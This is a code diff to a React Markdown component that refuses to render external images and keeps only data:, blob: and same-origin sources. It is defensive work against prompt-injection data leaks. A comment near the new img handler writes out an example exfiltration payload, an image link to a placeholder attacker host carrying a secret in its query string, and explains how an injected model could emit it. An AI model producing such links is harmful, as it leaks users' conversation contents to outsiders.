@@ -25,7 +25,7 @@
  */
 
 import { useMemo, type ComponentProps } from 'react';
-import ReactMarkdown, { type Components } from 'react-markdown';
+import ReactMarkdown, { defaultUrlTransform, type Components } from 'react-markdown';
 import remarkGfm from 'remark-gfm';
 import { visit } from 'unist-util-visit';
 import type { Node, Parent } from 'unist';
@@ -156,6 +156,30 @@ const components: Components = {
     );
   },
 
+  img({ src, alt, ...props }) {
+    // Answer text is model output, and a model under prompt injection can emit
+    // `![](https://attacker/?q=<secret>)` — the browser then GETs that URL and the query string
+    // leaks whatever the model was told to put in the `alt`/path, exfiltrating conversation text.
+    // The CSP's `img-src` is the last line, but this component owns the first: an `<img>` is only
+    // rendered for a source the app itself produced — an inlined `data:image/`, a `blob:` URL the
+    // page minted, or a leading-slash same-origin path. Anything absolute or external (including
+    // protocol-relative `//host/...`) is not a load at all; it becomes an inert placeholder that
+    // makes the omission visible without ever emitting a `src`.
+    const source = typeof src === 'string' ? src : '';
+    const isLocal =
+      source.startsWith('data:image/') ||
+      source.startsWith('blob:') ||
+      (source.startsWith('/') && !source.startsWith('//'));
+    if (isLocal) {
+      return <img src={source} alt={alt ?? ''} {...props} />;
+    }
+    return (
+      <span className="text-muted-fg italic" data-testid="omitted-image">
+        [image omitted{alt ? `: ${alt}` : ''}]
+      </span>
+    );
+  },
+
   code({ className, children, ...props }) {
     const text = String(children ?? '');
     const isBlock = Boolean(className?.startsWith('language-'));
@@ -176,6 +200,27 @@ const components: Components = {
     );
   },
 };
+
+/**
+ * URL sanitiser for both links and images.
+ *
+ * react-markdown's `defaultUrlTransform` strips every protocol outside a small safe list — which
+ * includes `data:` and `blob:`, so a locally inlined image (`data:image/…`) or a page-minted
+ * `blob:` URL would arrive at the `img` component as an empty `src` and be dropped even though it
+ * is exactly the safe case we want to render. We keep the default for links (`href`) untouched and
+ * pass through `data:image/` and `blob:` only for an image `src`; the `img` component below is
+ * still the arbiter of what actually renders, so an external `src` remains inert regardless.
+ */
+function urlTransform(url: string, key: string, node: Readonly<{ tagName?: string }>): string {
+  if (
+    key === 'src' &&
+    node.tagName === 'img' &&
+    (url.startsWith('data:image/') || url.startsWith('blob:'))
+  ) {
+    return url;
+  }
+  return defaultUrlTransform(url);
+}
 
 /** Hoisted so the default does not mint a new array identity on every render, which would defeat
  *  the memo below. */
@@ -209,6 +254,7 @@ export function Markdown({
       <ReactMarkdown
         remarkPlugins={plugins}
         components={components}
+        urlTransform={urlTransform}
         // Belt and braces alongside not enabling rehype-raw.
         disallowedElements={['script', 'iframe', 'style', 'object', 'embed', 'form']}
         unwrapDisallowed
